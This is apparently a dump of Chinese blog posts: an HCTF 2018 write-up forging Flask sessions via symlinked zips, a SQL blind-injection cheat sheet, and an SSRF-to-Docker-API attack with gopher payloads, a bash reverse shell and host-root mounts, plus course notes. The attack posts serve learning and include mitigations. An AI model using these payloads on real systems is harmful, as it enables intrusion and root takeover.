将传入的value拼接上时间戳之后再拼接签名内容，签名实现继承自Signer类的get_signature方法123456def get_signature(self, value): \"\"\"Returns the signature for the given value\"\"\" value = want_bytes(value) key = self.derive_key() sig = self.algorithm.get_signature(key, value) return base64_encode(sig) 因此，整个序列化的流程便是将obj处理为json格式后根据长度选择是否zlib压缩，之后再进行base64加密，拼接上当前时间戳之后再使用hmac签名并且拼接到该字符串上即为我们所需要的payload。 反序列化反签名的流程主要为TimedSerializer类的loads函数1234567891011121314151617181920212223242526class TimedSerializer(Serializer): \"\"\"Uses the :class:`TimestampSigner` instead of the default :meth:`Signer`. \"\"\" default_signer = TimestampSigner def loads(self, s, max_age=None, return_timestamp=False, salt=None): \"\"\"Reverse of :meth:`dumps`, raises :exc:`BadSignature` if the signature validation fails. If a `max_age` is provided it will ensure the signature is not older than that time in seconds. In case the signature is outdated, :exc:`SignatureExpired` is raised which is a subclass of :exc:`BadSignature`. All arguments are forwarded to the signer's :meth:`~TimestampSigner.unsign` method. \"\"\" base64d, timestamp = self.make_signer(salt) \\ .unsign(s, max_age, return_timestamp=True) payload = self.load_payload(base64d) if return_timestamp: return payload, timestamp return payload def loads_unsafe(self, s, max_age=None, salt=None): load_kwargs = &#123;'max_age': max_age&#125; load_payload_kwargs = &#123;&#125; return self._loads_unsafe_impl(s, salt, load_kwargs, load_payload_kwargs) 这里的loads部分使用TimestampSigner来对传入的数据进行解析，查看TimestampSinger中关于签名与反签名的源码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263def sign(self, value): \"\"\"Signs the given string and also attaches a time information.\"\"\" value = want_bytes(value) timestamp = base64_encode(int_to_bytes(self.get_timestamp())) sep = want_bytes(self.sep) value = value + sep + timestamp return value + sep + self.get_signature(value) def unsign(self, value, max_age=None, return_timestamp=False): \"\"\"Works like the regular :meth:`~Signer.unsign` but can also validate the time. See the base docstring of the class for the general behavior. If `return_timestamp` is set to `True` the timestamp of the signature will be returned as naive :class:`datetime.datetime` object in UTC. \"\"\" try: result = Signer.unsign(self, value) sig_error = None except BadSignature as e: sig_error = e result = e.payload or b'' sep = want_bytes(self.sep) # If there is no timestamp in the result there is something # seriously wrong. In case there was a signature error, we raise # that one directly, otherwise we have a weird situation in which # we shouldn't have come except someone uses a time-based serializer # on non-timestamp data, so catch that. if not sep in result: if sig_error: raise sig_error raise BadTimeSignature('timestamp missing', payload=result) value, timestamp = result.rsplit(sep, 1) try: timestamp = bytes_to_int(base64_decode(timestamp)) except Exception: timestamp = None # Signature is *not* okay. Raise a proper error now that we have # split the value and the timestamp. if sig_error is not None: raise BadTimeSignature(text_type(sig_error), payload=value, date_signed=timestamp) # Signature was okay but the timestamp is actually not there or # malformed. Should not happen, but well. We handle it nonetheless #检查timestamp if timestamp is None: raise BadTimeSignature('Malformed timestamp', payload=value) # Check timestamp is not older than max_age if max_age is not None: age = self.get_timestamp() - timestamp if age &gt; max_age: raise SignatureExpired( 'Signature age %s &gt; %s seconds' % (age, max_age), payload=value, date_signed=self.timestamp_to_datetime(timestamp)) if return_timestamp: return value, self.timestamp_to_datetime(timestamp) return value unsigin过程直接调用父类Signer的unsign,再进行timestamp的检查，由于之前调用时传入了max_age所以会检查timestamp是否超时（当时没注意到这一点一直以为随便一个timestamp就可以结果gg了。。。） 序列化与反序列化的总结最后经过flask处理的字符串的格式为： json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息 对于以上的调用我们可以总结为这样的代码(与服务器上的python版本无关，如果不确定服务器运行环境timestamp最好根据服务器反馈获取)：12345678910111213141516171819202122from itsdangerous import *from flask.sessions import *key='*******'salt=\"cookie-session\"serializer=session_json_serializerdigest_method=hashlib.sha1key_derivation='hmac'signer_kwargs = dict( key_derivation=key_derivation, digest_method=digest_method )def serialize(obj,timestamp,sep): my_serializer=URLSafeTimedSerializer(key,salt=salt,serializer=serializer,signer_kwargs=signer_kwargs) base64d=my_serializer.dump_payload(obj) #数据压缩 data=base64d+sep+timestamp #拼接timestamp result=data+sep+my_serializer.make_signer(salt).get_signature(data) #拼接签名内容 return result 而从cookie获取session的过程便是验证签名-&gt;验证是否过期-&gt;解码，解码可以使用phith0n师傅的payload：123456789101112131415161718192021222324252627282930313233#!/usr/bin/env python3import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload): payload, sig = payload.rsplit(b'.', 1) payload, timestamp = payload.rsplit(b'.', 1) decompress = False if payload.startswith(b'.'): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception('Could not base64 decode the payload because of ' 'an exception') if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception('Could not zlib decompress the payload before ' 'decoding the payload') return session_json_serializer.loads(payload)if __name__ == '__main__': print(decryption(sys.argv[1].encode())) 需要特别注意的是python2与python3下产生的timestamp是不一样的！！！当时被这个问题坑了很久。。。 hctf两道题目的wp有了以上的分析要解决hctf的这两道题目就很容易了： adminhttp://admin.2018.hctf.io/index 这道题目我们能做出来是因为在github上搜索hctf,按照recent updated得到了题目的repohttps://github.com/woadsl1234/hctf_flask repo中暴露了私钥信息,而且题目只需要能用admin用户登入即可，因此可以直接使用上面的脚本跑出admin用户的session来。 hide and seekhttp://hideandseek.2018.hctf.io/ 这道题目中登入后会要求我们上传一个zip文件,如果zip文件内的所有文件都是文本文件便可以成功返回文件的内容。然而zip文件中也可以包含软链接,采用zip -ry out.zip link即可将一个软链接打包到out.zip中。因此我们可以尝试上传包含/proc/self/environ软链接的压缩包来获取一些运行环境信息12ln -s /proc/self/environ linkzip -ry out.zip link 上传后可以获得当前一些环境信息：可以发现uwsgi配置文件的路径/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini,尝试读取配置文件123[uwsgi]module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_maincallable=app 可以得知当前脚本为/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py从而获取到源码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586# -*- coding: utf-8 -*-from flask import Flask,session,render_template,redirect, url_for, escape, request,Responseimport uuidimport base64import randomimport flagfrom werkzeug.utils import secure_filenameimport osrandom.seed(uuid.getnode())app = Flask(__name__)app.config['SECRET_KEY'] = str(random.random()*100)app.config['UPLOAD_FOLDER'] = './uploads'app.config['MAX_CONTENT_LENGTH'] = 100 * 1024ALLOWED_EXTENSIONS = set(['zip'])def allowed_file(filename): return '.' in filename and \\ filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS@app.route('/', methods=['GET'])def index(): error = request.args.get('error', '') if(error == '1'): session.pop('username', None) return render_template('index.html', forbidden=1) if 'username' in session: return render_template('index.html', user=session['username'], flag=flag.flag) else: return render_template('index.html')@app.route('/login', methods=['POST'])def login(): username=request.form['username'] password=request.form['password'] if request.method == 'POST' and username != '' and password != '': if(username == 'admin'): return redirect(url_for('index',error=1)) session['username'] = username return redirect(url_for('index'))@app.route('/logout', methods=['GET'])def logout(): session.pop('username', None) return redirect(url_for('index'))@app.route('/upload', methods=['POST'])def upload_file(): if 'the_file' not in request.files: return redirect(url_for('index')) file = request.files['the_file'] if file.filename == '': return redirect(url_for('index')) if file and allowed_file(file.filename): filename = secure_filename(file.filename) file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename) if(os.path.exists(file_save_path)): return 'This file already exists' file.save(file_save_path) else: return 'This file is not a zipfile' try: extract_path = file_save_path + '_' os.system('unzip -n ' + file_save_path + ' -d '+ extract_path) read_obj = os.popen('cat ' + extract_path + '/*') file = read_obj.read() read_obj.close() os.system('rm -rf ' + extract_path) except Exception as e: file = None os.remove(file_save_path) if(file != None): if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1): return redirect(url_for('index', error=1)) return Response(file)if __name__ == '__main__': #app.run(debug=True) app.run(host='127.0.0.1', debug=True, port=10008) 然而并无法获取flag.py的源码，因为限制了内容不能包含hctf。尝试获取/app/hard_t0_guess_n9f5a95b5ku9fg/templates/index.html可以得知只要能用admin登入即可获得flag. 这里我们重点查看payload中SECRET_KEY的生成方式 123random.seed(uuid.getnode())app = Flask(__name__)app.config['SECRET_KEY'] = str(random.random()*100) 可以看到随机数的种子为uuid.getnode().而uuid.getnode()函数返回的便是当前网卡的mac地址。那么要怎样获取服务器上的网卡地址?这里便可以通过linux强大的特殊文件系统来获取。首先利用之前的方法读取/proc/net/dev可以发现服务器上的所有网卡。可以发现服务器只有eth0和lo两个网卡。之后再读取/sys/class/net/eth0/address即可获取eth0网卡的mac地址。获取了地址，我们便获取了SECRET_KEY，之后便可以使用我们上面的payload来伪造session从二获取flag。 后记通过这次hctf深入的了解了flask的客户端session的生成过程，可以说hctf相比最近的一些神仙大战确实是异常很适合web狗的比赛了。每年的hctf都能学到一些东西，希望以后能多一些这样干货满满的比赛。○|￣|_ps:如果出一道改了源码改了默认salt和签名机制的题目会不会被打死ヾ(≧∇≦*)ゝ","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://hexo.imagemlt.xyz/tags/ctf/"},{"name":"flask","slug":"flask","permalink":"https://hexo.imagemlt.xyz/tags/flask/"}]},{"title":"指令系统","slug":"指令系统","date":"2018-10-27T12:15:25.000Z","updated":"2019-02-02T00:29:25.677Z","comments":true,"path":"post/指令系统/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/指令系统/index.html","excerpt":"","text":"寻址方式 立即寻址 1MOV AL,01010101B 寄存器寻址 1MOV AX,BX 存储器操作数寻址 逻辑地址：段寄存器名称:偏移地址表达式 直接寻址 1MOV BX,DS:[1234H] 寄存器间接寻址 1MOV AL,[BX] 12MOV BP,MESGMOV CL,ES:[BP] ;ES附加段MESG字节单元取数-&gt;CL 基址寻址 逻辑地址表达方式:段寄存器:[基址寄存器+位移量]/段寄存器:位移量[基址寻址器] 12345678MOV DL,DS:[BP+10]MOV EDX,[EAX+10H]``` * 变址寻址&gt;段寄存器:[比例因子×变址寄存器+位移量]/段寄存器:位移量[比例因子×变址寄存器]```asmMOV AL,[2*EBX+10]MOV AH,[SI+5] ;只能选择SI DI两个存储器 *基址加变址寻址 有比例因子的基地址加变址寻址：段寄存器:[基址寄存器+比例因子×变址寄存器+位移量]段寄存器:位移量[基址寄存器+比例因子x变址寄存器]段寄存器:位移量[基址寄存器][比例因子x变址寄存器]基址寄存器与变址寄存器都必须是规定的32位寄存器 没有比例因子的基址加变址寻址:段寄存器:[基址寄存器+变址寄存器+位移量]段寄存器:位移量[基址寄存器+变址寄存器]段寄存器:位移量[基址寄存器][变址寄存器]基址寄存器与变址寄存器必须是指定的16位寄存器 基址、变址、基址加变址这三种寻址方式中偏移地址表达式中的位移量是无符号整数 带有比例因子的变址寻址同行用于检索一维数组元素 带有比例因子的基址加变址通常用于检索二维数组","categories":[],"tags":[{"name":"assembly","slug":"assembly","permalink":"https://hexo.imagemlt.xyz/tags/assembly/"}]},{"title":"sql盲注总结[长期更新]","slug":"sql盲注总结","date":"2018-10-06T09:59:28.000Z","updated":"2019-02-02T00:29:25.608Z","comments":true,"path":"post/sql盲注总结/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/sql盲注总结/index.html","excerpt":"","text":"XOR注入 基本payload 123admin^(ascii(mid((password)from(i)))&gt;j)^'1'='1'%23或者admin^(ascii(mid((password)from(i)for(1)))&gt;j)^'1'='1'%23 ascii函数默认取字符串中第一个字符的ascii码作为输出 使用场景 过滤了关键字:and or 过滤了逗号 过滤了空格 regexp注入 基本payload 1select (select xxxx) regexp &apos;正则&apos; 使用场景 过滤了=，in,like order by 盲注 基本payload 1select * from users where user_id=&apos;1&apos; union select 1,2,&apos;a&apos;,4,5,6,7 order by 3 使用场景 过滤了列名 过滤了括号 适用于已知该表的列名以及列名位置的注入 join注入 payload: 12345678910111&apos; union select * from(select 1)a join (select 2)b %23union allselect * from( (select 1)a join( select F.[需要查询的字段号] from( select * from [需要查询的表有多少个字段就join多少个] union select * from [需要查询的表] [limit子句] )F-- 我们创建的虚拟表没有表名，因此定义一个别名，然后直接[别名].[字段号]查询数据 )b-- 同上[还差多少字段就再join多少个，以满足字段数相同的原则]) 使用场景： 过滤了逗号、字段名 Other tips 一次性爆所有表名和字段名： 1(SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema&gt;=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] &gt;',table_name,' &gt; ',column_name))))x)","categories":[{"name":"CTF","slug":"CTF","permalink":"https://hexo.imagemlt.xyz/categories/CTF/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://hexo.imagemlt.xyz/tags/ctf/"}]},{"title":"编译原理——第一课-绪论-笔记","slug":"编译原理——第一课-绪论-笔记","date":"2018-09-28T14:05:47.000Z","updated":"2019-02-02T00:29:25.707Z","comments":true,"path":"post/编译原理——第一课-绪论-笔记/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/编译原理——第一课-绪论-笔记/index.html","excerpt":"","text":"第一课 绪论编译器在语言处理系统中的位置 编译器的结构12345678910graph TD; 字符流--&gt;词法分析器; 词法分析器--&gt;|词法单元流|语法分析器; 语法分析器--&gt;|语法树|语义分析器; 语义分析器--&gt;|语法树|中间代码生成器; 中间代码生成器--&gt;|中间表示形式|机器无关代码优化器; 机器无关代码优化器--&gt;|中间表示形式|目标代码生成器; 目标代码生成器--&gt;|目标机器语言|机器相关代码优化器; 机器相关代码优化器--&gt;目标机器语言; 词法分析/扫描(Scanning) 主要任务 从左向右逐行扫描源程序的字符，识别各个单词并确定类型，表示为词法单元(token)格式; 单词类型 种类 种别码 关键字 program、if、else、then、… 一词一码 标识符 变量名、数组名、记录名、过程名、… 多词一码 常量 整型、浮点型、字符型、布尔型、… 一型一码 运算符 算数 关系 逻辑 一词一码或者一型一码 界限符 ; () = {}… 一词一码 语法分析(parsing) 从词法分析器的token序列中识别短语，构造语法分析树(parse tree) 语义分析 主要任务： 收集标识符的属性信息 种属 简单变量、符合变量（数组、记录、…)、过程 类型 存储位置、长度 值 作用域 参数与返回值信息 语义检查 中间代码生成 常用的中间表示形式 三地址码 类似汇编 每个指令最多三个操作数 语法结构树/语法树(Syntax Trees) 目标代码生成器 以源程序的中间表示形式作为输入并映射到目标语言 重要任务：分配合理的寄存器 代码优化 等价程序变换以优化时空效率title: start=>start: 源程序 preprocessor=>operation: 预处理器(preprocessor) compiler=>operation: 编译器(compiler) assembler=>operation: 汇编器(assembler) linker_and_loader=>operation: 链接器(Linker)/加载器(Loader) end=>end: 目标机器代码 start->preprocessor preprocessor->compiler compiler->assembler assembler->linker_and_loader linker_and_loader->end{\"scale\":1,\"line-width\":2,\"line-length\":50,\"text-margin\":10,\"font-size\":12} var code = document.getElementById(\"flowchart-0-code\").value; var options = JSON.parse(decodeURIComponent(document.getElementById(\"flowchart-0-options\").value)); var diagram = flowchart.parse(code); diagram.drawSVG(\"flowchart-0\", options);","categories":[],"tags":[{"name":"Compile-principle","slug":"Compile-principle","permalink":"https://hexo.imagemlt.xyz/tags/Compile-principle/"}]},{"title":"设计模式_第一课-六大原则","slug":"设计模式-第一课-六大原则","date":"2018-09-17T14:08:00.000Z","updated":"2019-02-02T00:29:25.708Z","comments":true,"path":"post/设计模式-第一课-六大原则/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/设计模式-第一课-六大原则/index.html","excerpt":"","text":"设计模式的六大原则开闭原则(Open Close Principle)开闭原则的意思是：对扩展开放，对修改关闭 程序需要拓展时不能修改原有代码 使用接口和抽象类 里氏代换原则(Liskov Substitution Principle)任何基类可以出现的地方子类一定可以出现(派生类可以完全替换掉基类且软件单位的功能不受影响) 依赖倒转原则(Dependence Inversion Principle)这个原则是开闭原则的基础。 针对接口编程 依赖于抽象而不依赖于具体 接口隔离原则(Interface Segregation Principle) 使用多个隔离的接口比使用单个接口好 降低类之间的耦合度 迪米特法则，又称最少知道原则(Demeter Principle)一个实体应当尽少地与其他实体之间发生相互作用，使得系统功能模块相互独立 合成复用原则(Composite Reuse Principle)尽量使用合成/聚合的方式而不是使用继承","categories":[],"tags":[]},{"title":"利用SSRF攻击docker remote api从而获取服务器root权限的探索","slug":"SSRF-DOCKER-RCE","date":"2018-08-16T00:57:59.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/SSRF-DOCKER-RCE/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/SSRF-DOCKER-RCE/index.html","excerpt":"","text":"首发于freebuf http://www.freebuf.com/articles/web/179910.html 这几天在做关于自动化部署docker镜像方面的项目，从而接触到了docker的api，而docker的api也可以通过tcp连接的形式来进行访问。那么从一个安全爱好者的角度出发，是否可以利用docker的远程api来实现提权等一系列的操作？查找了各种资料之后，最后我探索到了一条通过SSRF漏洞来攻击docker远程api从而最终还能够获得远程主机的root权限的攻击思路，并写了这篇文章来记录一下整个过程及其防范的方法。 什么是docker远程api？Docker Remote API是docker团队为了方便我们远程管理docker而为我们提供的一套api接口。在默认的情况下，docker daemon坚挺在unix socket上，通常为unix:///var/run/docker.sock。此外，在一些情况比如当我们需要远程管理docker服务器或者是创建docker集群的情况下，我们往往需要开启docker的远程api。这里给出在ubuntu上的一种开启方法： 编辑/lib/systemd/system/docker.service文件，修改ExecStart一行为： 12345678[Service]Type=notify# the default is not to use systemd for cgroups because the delegate issues still# exists and systemd currently does not support the cgroup feature set required# for containers run by dockerExecStart=/usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:4243ExecReload=/bin/kill -s HUP $MAINPIDLimitNOFILE=1048576 之后再重启docker 1sudo service docker restart 我们便可以利用docker client或者任意http客户端访问docker服务，例如 可以看到docker提供的api其实也是一个restful形式的http接口，具体的文档可以再docker的官网获取：Engine API V1.24 这里列出几个重要的接口： 列出所有的容器 1$ curl http:/localhost:4243/v1.24/containers/json 列出所有镜像 12345$ curl http:/localhost:4243/v1.24/images/json[&#123; &quot;Id&quot;:&quot;sha256:31d9a31e1dd803470c5a151b8919ef1988ac3efd44281ac59d43ad623f275dcd&quot;, &quot;ParentId&quot;:&quot;sha256:ee4603260daafe1a8c2f3b78fd760922918ab2441cbb2853ed5c439e59c52f96&quot;, ...&#125;] 创建并运行容器 123456789101112$ curl -H &quot;Content-Type: application/json&quot; \\ -d &apos;&#123;&quot;Image&quot;: &quot;alpine&quot;, &quot;Cmd&quot;: [&quot;echo&quot;, &quot;hello world&quot;]&#125;&apos; \\ -X POST http:/localhost:4243/v1.24/containers/create&#123;&quot;Id&quot;:&quot;1c6594faf5&quot;,&quot;Warnings&quot;:null&#125;$ curl -X POST http:/localhost:4243/v1.24/containers/1c6594faf5/starthttp:/localhost:4243/v1.24/containers/1c6594faf5/wait&#123;&quot;StatusCode&quot;:0&#125;$ curl &quot;http:/localhost:4243/v1.24/containers/1c6594faf5/logs?stdout=1&quot;hello world 可以看到如果开放了docker远程api，我们便可以使用restful接口来实现一切docker容器的操作。 怎样利用docker容器提权？有些朋友可能会问了：docker容器内部是一个虚拟化的环境，与主机隔离，那么怎样才能利用docker容器达到主机的控制权？这里就涉及到docker运行时的用户权限了。docker daemon运行时是以root用户运行，因而具有极大的权限： 123$ ps aux|grep dockerdroot 1723 0.1 0.8 563472 68900 ? Ssl 17:17 0:24 /usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:4243image 25504 0.0 0.0 15984 936 pts/3 S+ 21:12 0:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn dockerd 那么怎样通过docker daemon最终获得服务器的root权限？这里我们可以利用docker挂载宿主机文件的功能，直接挂载高权限目录，从而在容器内部获取宿主机的控制权限。这里有一个黑魔法： 1docker run -v /:/hostOS -i -t chrisfosterelli/rootplease 运行后的输出如下：我们退出docker,查看宿主机/root/目录：可以看到我们成功写入了/root文件夹一个文件。上面那条命令 docker run -v /:/hostOS -i -t chrisfosterelli/rootplease主要的作用是：从 Docker Hub 上面下载我们指定的镜像，然后运行。参数 -v 将容器外部的目录 / 挂载到容器内部 /hostOS，并且使用 -i 和 -t 参数进入容器的 shell。而这个镜像rootplease在容器内部执行了一个脚本exploit.sh，主要内容便是chroot到/hostOS中。这样我们便通过读写宿主机的任意文件实现了获取宿主机的最高权限。这个镜像的源码可以在Github上获取。 怎样通过SSRF完成攻击？这里我们的服务器端环境如下: 这里我们来看在php中经常出现的导致SSRF漏洞的代码实现： 12345678&lt;?php$curl=curl_init();curl_setopt($curl,CURLOPT_URL,$_GET[&apos;url&apos;]);curl_setopt($curl,CURLOPT_HEADER,0);curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);$data=curl_exec($curl);curl_close($curl);print_r($data); php中通常使用libcurl来实现http请求，这里可以看到$_GET[&#39;url&#39;]可控，从而可以请求任意站点，从而构成了SSRF漏洞。但是有的读者有可能会问：docker的api有很大一部分是需要post的，那么怎样才能发送post封包？这里便祭出我们的大杀器——gopher协议。Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。 这里Ricterz师傅曾经写过一篇很好的关于gopher协议扩展ssrf攻击面的文章。因此我们便可以通过gopher协议来访问内网开放的docker api从而实现攻击。我们可以先尝试获取所有的镜像： 12root@1ae6b62d1757:/var/www/html# curl localhost/curl.php?url=http://172.17.0.1:4243/containers/json[&#123;&quot;Id&quot;:&quot;fa169d6b4239882bb6a0a2d564fd9891c04cf199ac12daec514f69febf960e9b&quot;,&quot;Names&quot;:[&quot;/quirky_mcnulty&quot;],&quot;Image&quot;:&quot;chrisfosterelli/rootplease&quot;,&quot;ImageID&quot;:&quot;sha256:0db941813769383d7ed3bdcccd27af1b6d7b47ed0fb33f1b47f7bb937529fa3e&quot;,&quot;Command&quot;:&quot;/bin/bash exploit.sh&quot;,&quot;Created&quot;:1533475418,&quot;Ports&quot;:[],&quot;Labels&quot;:&#123;&#125;,&quot;State&quot;:&quot;running&quot;,&quot;Status&quot;:&quot;Up 17 minutes&quot;,&quot;HostConfig&quot;:&#123;&quot;NetworkMode&quot;:&quot;default&quot;&#125;,&quot;NetworkSettings&quot;:&#123;&quot;Networks&quot;:&#123;&quot;bridge&quot;:&#123;&quot;IPAMConfig&quot;:null,&quot;Links&quot;:null,&quot;Aliases&quot;:null,&quot;NetworkID&quot;:&quot;9a8a2dd6afbbc355194a5fd224757ac8fe11760dbfde91c07c46689146e15089&quot;,&quot;EndpointID&quot;:&quot;a079ba4ac68eafb5add6b56822dd13a288ca059a815e7a011e82bdcb8fd8542b&quot;,&quot;Gateway&quot;:&quot;172.17.0.1&quot;,&quot;IPAddress&quot;:&quot;172.17.0.4&quot;,&quot;IPPrefixLen&quot;:16,&quot;IPv6Gateway&quot;:&quot;&quot;,&quot;GlobalIPv6Address&quot;:&quot;&quot;,&quot;GlobalIPv6PrefixLen&quot;:0,&quot;MacAddress&quot;:&quot;02:42:ac:11:00:04&quot;,&quot;DriverOpts&quot;:null&#125;&#125;&#125;,&quot;Mounts&quot;:[&#123;&quot;Type&quot;:&quot;bind&quot;,&quot;Source&quot;:&quot;/&quot;,&quot;Destination&quot;:&quot;/hostOS&quot;,&quot;Mode&quot;:&quot;&quot;,&quot;RW&quot;:true,&quot;Propagation&quot;:&quot;rslave&quot;&#125;]&#125;,] 我们可以先构造一个特殊的docker镜像，并将之上传到DockerHub 123FROM ubuntu:14.04COPY exploit.sh /exploit.shENTRYPOINT [&quot;/bin/bash&quot;, &quot;exploit.sh&quot;] 这里我们的exploit.sh的写法： 12#!/bin/bashbash -i &gt;&amp; /dev/tcp/$1/$2 0&gt;&amp;1 这里的docker镜像已经上传到了dockerhub。 之后我们可以先构造合适的post封包： 123456POST /v1.24/images/create?fromImage=imagemlt/reverse_shell HTTP/1.1Host: localhost:4243User-Agent: Docker-Client/18.03.1-ce (linux)Content-Length: 0Content-Type: text/plainX-Registry-Auth: e30= 这个post封包的目标是让远程主机从dockerhub下载我们需要的镜像。构造为gopher格式为： 1gopher://172.17.0.1:4243/_POST%20/v1.24/images/create%3FfromImage%3Dimagemlt/reverse_shell%20HTTP/1.1%0AHost%3A%20localhost%3A4243%0AUser-Agent%3A%20Docker-Client/18.03.1-ce%20%28linux%29%0AContent-Length%3A%200%0AContent-Type%3A%20text/plain%0A X-Registry-Auth:%20e30%3D%0A%0A 通过ssrf的点触发即可在远程服务器下载我们的镜像。 之后再创建容器 1234567POST /v1.24/containers/create HTTP/1.1Host: localhost:4243User-Agent: Docker-Client/18.03.1-ce (linux)Content-Length: 99Content-Type: application/json&#123;&quot;Cmd&quot;:[&quot;your ip&quot;,&quot;3456&quot;],&quot;Image&quot;:&quot;imagemlt/reverse_shell&quot;,&quot;HostConfig&quot;:&#123;&quot;Binds&quot;:[&quot;/:/hostOS&quot;]&#125;&#125; 将封包包装为gopher的形式： 1gopher://172.17.0.1:4243/_POST%20/v1.24/containers/create%20HTTP/1.1%0AHost%3A%20localhost%3A4243%0AUser-Agent%3A%20Docker-Client/18.03.1-ce%20%28linux%29%0AContent-Length%3A%2099%0AContent-Type%3A%20application/json%0A%0A%7B%22Cmd%22%3A%5B%22your ip%22%2C%223456%22%5D%2C%22Image%22%3A%22imagemlt/reverse_shell%22%2C%22HostConfig%22%3A%7B%22Binds%22%3A%5B%22/%3A/hostOS%22%5D%7D%7D%0A%0d%0a 这里我们再最后多加了一些%0d%0a从而让连接能够断开。然后利用之前的ssrf的地方请求这个url，可以获得创建的容器id： 获取id后我们再post相应的使容器运行的封包： 12345POST /v1.24/containers/5a42a09f7bb889f53943015346682388d40a151ec5bad30024282eee11811380/start HTTP/1.1Host: localhost:4243User-Agent: Docker-Client/18.03.1-ce (linux)Content-Length: 0Content-Type: application/json 我们的服务器端nc端口3456，构造gopher格式的url候再次发送封包： 可以看到服务器端成功返回shell，且已成功挂载宿主机根目录到/hostOS下。 这样我们便通过ssrf与docker未授权api完成了一次攻击，并且获取了宿主机的root权限！ 除了反弹shell的方法，我们也可以借助写crontab的方法来获得最后的shell，这里便不再赘述。 如何防范？在不必需的情况下，不要启用docker的remote api服务，如果必须使用的话，可以采用如下的加固方式： 设置ACL，仅允许信任的来源IP连接； 设置TLS认证，官方的文档为Protect the Docker daemon socket 客户端与服务器端通讯的证书生成后，可以通过以下命令启动docker daemon： 1docker -d --tlsverify --tlscacert=ca.pem --tlscert=server-cert.pem --tlskey=server-key.pem -H=tcp://10.10.10.10:2375 -H unix:///var/run/docker.sock 客户端连接时需要设置以下环境变量 1234export DOCKER_TLS_VERIFY=1export DOCKER_CERT_PATH=~/.dockerexport DOCKER_HOST=tcp://10.10.10.10:2375export DOCKER_API_VERSION=1.12 这样便可以避免未授权的docker api被远程利用。 总结未授权的docker remote api具有极大的风险，当结合ssrf漏洞时可以作为渗透测试扩展供给面的工具，最后获得root shell.因此我们做开发时应该严格防范。最后总结一下我们的攻击思路： 参考资料 https://sec.xiaomi.com/article/22 http://dockone.io/article/401 https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2","categories":[{"name":"web","slug":"web","permalink":"https://hexo.imagemlt.xyz/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://hexo.imagemlt.xyz/tags/web/"},{"name":"CTF","slug":"CTF","permalink":"https://hexo.imagemlt.xyz/tags/CTF/"}]},{"title":"redis源码之dict","slug":"redis源码-dict-h-dict-c","date":"2018-08-09T14:26:11.000Z","updated":"2019-02-02T00:29:25.581Z","comments":true,"path":"post/redis源码-dict-h-dict-c/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/redis源码-dict-h-dict-c/index.html","excerpt":"","text":"dict.h中的结构体 dictEntry结构体 12345678910111213typedef struct dictEntry &#123; // 关键字key定义 void *key; // 值value定义，这里采用了联合体，根据union的特点，联合体只能存放一个被选中的成员 union &#123; void *val; // 自定义类型 uint64_t u64; // 无符号整形 int64_t s64; // 有符号整形 double d; // 浮点型 &#125; v; // 指向下一个键值对节点 struct dictEntry *next;&#125; dictEntry; dictType结构体 123456789101112131415/* 定义了字典操作的公共方法，类似于adlist.h文件中list的定义，将对节点的公共操作方法统一定义。搞不明白为什么要命名为dictType */typedef struct dictType &#123; /* hash方法，根据关键字计算哈希值 */ unsigned int (*hashFunction)(const void *key); /* 复制key */ void *(*keyDup)(void *privdata, const void *key); /* 复制value */ void *(*valDup)(void *privdata, const void *obj); /* 关键字比较方法 */ int (*keyCompare)(void *privdata, const void *key1, const void *key2); /* 销毁key */ void (*keyDestructor)(void *privdata, void *key); /* 销毁value */ void (*valDestructor)(void *privdata, void *obj);&#125; dictType; dictht结构体 12345678910111213/* This is our hash table structure. Every dictionary has two of this as we * implement incremental rehashing, for the old to the new table. *//* 哈希表结构 */typedef struct dictht &#123; // 散列数组。哈希表内部是基于数组，数组的元素是dictEntry *类型，所以这里是指针数组。 dictEntry **table; // 散列数组的长度 unsigned long size; // sizemask等于size减1 unsigned long sizemask; // 散列数组中已经被使用的节点数量 unsigned long used;&#125; dictht; dict结构体 1234567891011121314151617/* 字典的主操作类，对dictht结构再次包装 */typedef struct dict &#123; // 字典类型 dictType *type; // 私有数据指针 void *privdata; // 一个字典中有两个哈希表，后面的分析中，我们将ht[0]称作就表，ht[1]称作新表 /* 